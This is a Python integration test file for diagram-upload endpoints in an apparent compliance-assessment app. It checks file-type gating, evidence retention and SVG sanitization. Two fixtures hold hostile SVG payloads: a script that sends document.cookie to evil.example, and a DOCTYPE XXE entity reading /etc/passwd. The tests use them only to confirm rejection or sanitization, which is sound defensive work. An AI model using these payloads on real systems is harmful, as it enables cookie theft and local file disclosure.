"""Integration tests for the Network Diagram / Data Flow Diagram endpoints
(docs/pdf_ssp_template_spec.md's Addendum, migration 0029).

Covers:
  - 404 before a system description exists
  - Upload creates an Evidence row and repoints SystemDescription's FK
  - GET /system-description reflects the current diagram's evidence_id/url
  - Replace uploads a NEW Evidence row and repoints the FK -- the prior
    Evidence row (and its stored bytes) is left untouched, verified by
    querying Postgres directly, not just trusting the API response
  - MIME/extension gating: only image/png and image/svg+xml are accepted
  - PNG magic-byte mismatch is rejected
  - A malicious SVG is either rejected outright (DOCTYPE) or actually
    sanitized (script/onload/external ref) -- verified against the bytes
    that landed in storage, not just a 200 response
  - The generic control-state evidence upload endpoint also sanitizes SVG
    now that image/svg+xml is in its shared allowlist

Run in-container:
    docker compose exec backend pytest tests/test_diagram_upload.py -v
"""
from __future__ import annotations

import uuid

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select

from app.auth import get_current_user
from app.db import get_session
from app.engine import start_assessment
from app.main import app
from app.models import (
    AssessmentObjective,
    Control,
    ControlState,
    Evidence,
    Framework,
    Organization,
    SystemDescription,
)
from app.storage import StorageClient, get_storage_client
from tests.conftest import _app_session, _authed, _grant

# ---------------------------------------------------------------------------
# In-memory storage
# ---------------------------------------------------------------------------


class InMemoryStorageClient(StorageClient):
    def __init__(self) -> None:
        self.files: dict[str, bytes] = {}

    def upload_file(self, key: str, data: bytes, content_type: str) -> None:
        self.files[key] = data

    def presigned_url(
        self, key: str, expires_in: int = 300, download_filename: str | None = None
    ) -> str:
        return f"http://fake-storage/{key}"

    def delete_file(self, key: str) -> None:
        self.files.pop(key, None)


@pytest.fixture
def storage():
    return InMemoryStorageClient()


@pytest.fixture
def client(db_session, storage, fake_msp_admin):
    app.dependency_overrides[get_session] = _app_session(db_session)
    app.dependency_overrides[get_storage_client] = lambda: storage
    app.dependency_overrides[get_current_user] = _authed(db_session, fake_msp_admin)
    yield TestClient(app)
    app.dependency_overrides.clear()


def _own_org(db_session, fake_msp_admin, *, name: str | None = None) -> Organization:
    org = Organization(id=fake_msp_admin.org_id, name=name or f"TestOrg-{uuid.uuid4().hex[:8]}")
    db_session.add(org)
    db_session.flush()
    _grant(db_session, fake_msp_admin)
    return org


_SD_BASE = {
    "system_name": "ACME CUI System",
    "system_type": "major_application",
    "operational_status": "operational",
}

_FAKE_PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 100
_CLEAN_SVG = (
    b'<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    b'<rect width="50" height="50" fill="#336699"/></svg>'
)
_SVG_WITH_SCRIPT = (
    b'<svg xmlns="http://www.w3.org/2000/svg">'
    b"<script>fetch('https://evil.example/steal?c='+document.cookie)</script>"
    b'<rect width="10" height="10"/></svg>'
)
_SVG_WITH_DOCTYPE_XXE = (
    b'<?xml version="1.0"?>'
    b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    b'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
)


# ---------------------------------------------------------------------------
# 404 before system description exists
# ---------------------------------------------------------------------------


@pytest.mark.integration
def test_upload_diagram_404s_before_system_description_exists(client, db_session, fake_msp_admin):
    org = _own_org(db_session, fake_msp_admin)
    r = client.post(
        f"/orgs/{org.id}/system-description/network-diagram",
        files={"file": ("net.png", _FAKE_PNG, "image/png")},
    )
    assert r.status_code == 404


# ---------------------------------------------------------------------------
# Happy path: upload, FK repoint, GET reflects it
# ---------------------------------------------------------------------------


@pytest.mark.integration
def test_upload_network_diagram_png_creates_evidence_and_repoints_fk(
    client, db_session, fake_msp_admin
):
    org = _own_org(db_session, fake_msp_admin)
    client.put(f"/orgs/{org.id}/system-description", json=_SD_BASE)

    r = client.post(
        f"/orgs/{org.id}/system-description/network-diagram",
        files={"file": ("net.png", _FAKE_PNG, "image/png")},
    )
    assert r.status_code == 200
    body = r.json()
    assert body["mime_type"] == "image/png"
    assert body["url"] is not None
    evidence_id = uuid.UUID(body["evidence_id"])

    ev = db_session.get(Evidence, evidence_id)
    assert ev is not None
    assert ev.artifact_type == "network_diagram"
    assert ev.kind == "file"
    assert ev.sha256_hash is not None

    sd = db_session.scalars(
        select(SystemDescription).where(SystemDescription.org_id == org.id)
    ).first()
    assert sd.network_diagram_evidence_id == evidence_id


@pytest.mark.integration
def test_get_system_description_reflects_diagram_urls(client, db_session, fake_msp_admin):
    org = _own_org(db_session, fake_msp_admin)
    client.put(f"/orgs/{org.id}/system-description", json=_SD_BASE)
    client.post(
        f"/orgs/{org.id}/system-description/network-diagram",
        files={"file": ("net.png", _FAKE_PNG, "image/png")},
    )
    client.post(
        f"/orgs/{org.id}/system-description/data-flow-diagram",
        files={"file": ("flow.svg", _CLEAN_SVG, "image/svg+xml")},
    )

    r = client.get(f"/orgs/{org.id}/system-description")
    assert r.status_code == 200
    data = r.json()
    assert data["network_diagram_evidence_id"] is not None
    assert data["network_diagram_url"] is not None
    assert data["data_flow_diagram_evidence_id"] is not None
    assert data["data_flow_diagram_url"] is not None


# ---------------------------------------------------------------------------
# Replace: new Evidence row, old one retained untouched
# ---------------------------------------------------------------------------


@pytest.mark.integration
def test_replace_diagram_retains_prior_evidence_row_and_file(
    client, db_session, fake_msp_admin, storage
):
    org = _own_org(db_session, fake_msp_admin)
    client.put(f"/orgs/{org.id}/system-description", json=_SD_BASE)

    first = client.post(
        f"/orgs/{org.id}/system-description/network-diagram",
        files={"file": ("net-v1.png", _FAKE_PNG, "image/png")},
    ).json()
    first_id = uuid.UUID(first["evidence_id"])

    second = client.post(
        f"/orgs/{org.id}/system-description/network-diagram",
        files={"file": ("net-v2.png", _FAKE_PNG, "image/png")},
    ).json()
    second_id = uuid.UUID(second["evidence_id"])

    assert first_id != second_id

    # DB query, not the API response -- the whole point of the assertion.
    sd = db_session.scalars(
        select(SystemDescription).where(SystemDescription.org_id == org.id)
    ).first()
    assert sd.network_diagram_evidence_id == second_id

    old_ev = db_session.get(Evidence, first_id)
    assert old_ev is not None  # prior Evidence row still exists, not deleted
    assert old_ev.storage_key in storage.files  # its file is still in storage too

    new_ev = db_session.get(Evidence, second_id)
    assert new_ev is not None
    assert new_ev.storage_key in storage.files
    assert new_ev.storage_key != old_ev.storage_key


# ---------------------------------------------------------------------------
# MIME/extension gating
# ---------------------------------------------------------------------------


@pytest.mark.integration
def test_upload_rejects_disallowed_mime_type(client, db_session, fake_msp_admin):
    org = _own_org(db_session, fake_msp_admin)
    client.put(f"/orgs/{org.id}/system-description", json=_SD_BASE)
    r = client.post(
        f"/orgs/{org.id}/system-description/network-diagram",
        files={"file": ("net.pdf", b"%PDF-1.4 fake", "application/pdf")},
    )
    assert r.status_code == 422


@pytest.mark.integration
def test_upload_rejects_png_with_bad_magic_bytes(client, db_session, fake_msp_admin):
    org = _own_org(db_session, fake_msp_admin)
    client.put(f"/orgs/{org.id}/system-description", json=_SD_BASE)
    r = client.post(
        f"/orgs/{org.id}/system-description/network-diagram",
        files={"file": ("net.png", b"not actually a png", "image/png")},
    )
    assert r.status_code == 422


# ---------------------------------------------------------------------------
# SVG sanitization through the real endpoint -- verify stored bytes, not the
# HTTP status alone
# ---------------------------------------------------------------------------


@pytest.mark.integration
def test_malicious_svg_with_script_is_sanitized_not_just_accepted(
    client, db_session, fake_msp_admin, storage
):
    org = _own_org(db_session, fake_msp_admin)
    client.put(f"/orgs/{org.id}/system-description", json=_SD_BASE)

    r = client.post(
        f"/orgs/{org.id}/system-description/network-diagram",
        files={"file": ("net.svg", _SVG_WITH_SCRIPT, "image/svg+xml")},
    )
    assert r.status_code == 200
    evidence_id = uuid.UUID(r.json()["evidence_id"])
    ev = db_session.get(Evidence, evidence_id)
    stored_bytes = storage.files[ev.storage_key]

    assert b"script" not in stored_bytes
    assert b"evil.example" not in stored_bytes
    # The hash on the Evidence row must match the sanitized bytes actually
    # in storage, not the raw upload -- otherwise "sanitized" is fiction.
    import hashlib
    assert ev.sha256_hash == hashlib.sha256(stored_bytes).hexdigest()


@pytest.mark.integration
def test_malicious_svg_with_doctype_xxe_is_rejected_outright(client, db_session, fake_msp_admin):
    org = _own_org(db_session, fake_msp_admin)
    client.put(f"/orgs/{org.id}/system-description", json=_SD_BASE)

    r = client.post(
        f"/orgs/{org.id}/system-description/data-flow-diagram",
        files={"file": ("evil.svg", _SVG_WITH_DOCTYPE_XXE, "image/svg+xml")},
    )
    assert r.status_code == 422

    sd = db_session.scalars(
        select(SystemDescription).where(SystemDescription.org_id == org.id)
    ).first()
    assert sd.data_flow_diagram_evidence_id is None  # nothing was written


# ---------------------------------------------------------------------------
# The generic evidence pipeline also sanitizes SVG now
# ---------------------------------------------------------------------------


def _seed_control_state(db_session, org: Organization) -> ControlState:
    fw = Framework(key=f"fw-{uuid.uuid4().hex[:8]}", name="Test FW", version="r2")
    db_session.add(fw)
    db_session.flush()
    ctrl = Control(
        framework_id=fw.id,
        control_id=f"CM.L2-{uuid.uuid4().hex[:6]}",
        family="CM",
        title="Test control",
        requirement_text="Test",
        sprs_weight=1,
        sequence_order=0,
    )
    db_session.add(ctrl)
    db_session.flush()
    obj = AssessmentObjective(control_id=ctrl.id, objective_key="a", text="Test objective")
    db_session.add(obj)
    db_session.flush()
    assessment = start_assessment(db_session, org_id=org.id, framework_id=fw.id, name="T")
    db_session.commit()
    cs = db_session.scalars(
        select(ControlState).where(ControlState.assessment_id == assessment.id)
    ).first()
    return cs


@pytest.mark.integration
def test_generic_evidence_upload_sanitizes_svg_too(client, db_session, fake_msp_admin, storage):
    org = _own_org(db_session, fake_msp_admin)
    cs = _seed_control_state(db_session, org)

    r = client.post(
        f"/orgs/{org.id}/assessments/{cs.assessment_id}/control-states/{cs.id}/evidence",
        files={"file": ("boundary.svg", _SVG_WITH_SCRIPT, "image/svg+xml")},
        data={"artifact_type": "document"},
    )
    assert r.status_code == 201
    evidence_id = uuid.UUID(r.json()["id"])
    ev = db_session.get(Evidence, evidence_id)
    stored_bytes = storage.files[ev.storage_key]
    assert b"script" not in stored_bytes
    assert b"evil.example" not in stored_bytes


@pytest.mark.integration
def test_generic_evidence_upload_rejects_doctype_svg(client, db_session, fake_msp_admin):
    org = _own_org(db_session, fake_msp_admin)
    cs = _seed_control_state(db_session, org)

    r = client.post(
        f"/orgs/{org.id}/assessments/{cs.assessment_id}/control-states/{cs.id}/evidence",
        files={"file": ("evil.svg", _SVG_WITH_DOCTYPE_XXE, "image/svg+xml")},
        data={"artifact_type": "document"},
    )
    assert r.status_code == 422


# ---------------------------------------------------------------------------
# PDF placement: the diagram actually reaches the bundle export
# ---------------------------------------------------------------------------


@pytest.mark.integration
def test_uploaded_diagram_appears_in_bundle_html_and_pdf(client, db_session, fake_msp_admin):
    import io
    import zipfile

    org = _own_org(db_session, fake_msp_admin)
    cs = _seed_control_state(db_session, org)
    client.put(f"/orgs/{org.id}/system-description", json=_SD_BASE)
    client.post(
        f"/orgs/{org.id}/system-description/network-diagram",
        files={"file": ("net.svg", _CLEAN_SVG, "image/svg+xml")},
    )

    r = client.get(f"/orgs/{org.id}/assessments/{cs.assessment_id}/bundle")
    assert r.status_code == 200

    with zipfile.ZipFile(io.BytesIO(r.content)) as zf:
        html_name = next(
            n for n in zf.namelist() if n.endswith("01_system_description.html")
        )
        html = zf.read(html_name).decode()
        pdf_name = next(n for n in zf.namelist() if n.endswith("system_security_plan.pdf"))
        pdf_bytes = zf.read(pdf_name)

    assert "data:image/svg+xml;base64," in html
    assert "Network Diagram" in html
    assert pdf_bytes[:5] == b"%PDF-"
    # The base64-embedded SVG must be the sanitized bytes -- confirms the
    # bundle path doesn't somehow re-fetch or re-embed something else.
    import base64

    b64_start = html.index("data:image/svg+xml;base64,") + len("data:image/svg+xml;base64,")
    b64_end = html.index('"', b64_start)
    embedded = base64.b64decode(html[b64_start:b64_end])
    assert b"rect" in embedded
    assert b"script" not in embedded
